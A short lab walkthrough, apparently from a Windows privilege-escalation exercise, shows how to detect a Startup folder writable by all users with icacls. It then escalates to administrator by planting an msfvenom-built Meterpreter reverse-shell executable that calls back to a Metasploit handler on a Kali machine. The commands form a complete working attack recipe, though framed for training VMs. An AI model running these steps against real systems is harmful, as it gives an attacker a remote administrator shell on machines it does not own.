
### Detection

Windows VM
```sh
# Open command prompt and type: 
> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# From the output notice if the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
```

### Exploitation

Kali VM
```sh
# Open command prompt and type: 
> msfconsole
In Metasploit (msf > prompt) type: use multi/handler
In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
In Metasploit (msf > prompt) type: run
# Open another command prompt and type: 
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
# Copy the generated file, x.exe, to the Windows VM.
```

Windows VM
```sh
# Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
# Logoff.
# Login with the administrator account credentials.
```

Kali VM
```sh
# Wait for a session to be created, it may take a few seconds.
In Meterpreter(meterpreter > prompt) type: getuid
> getuid
# From the output, notice the user is “User-PC\Admin”
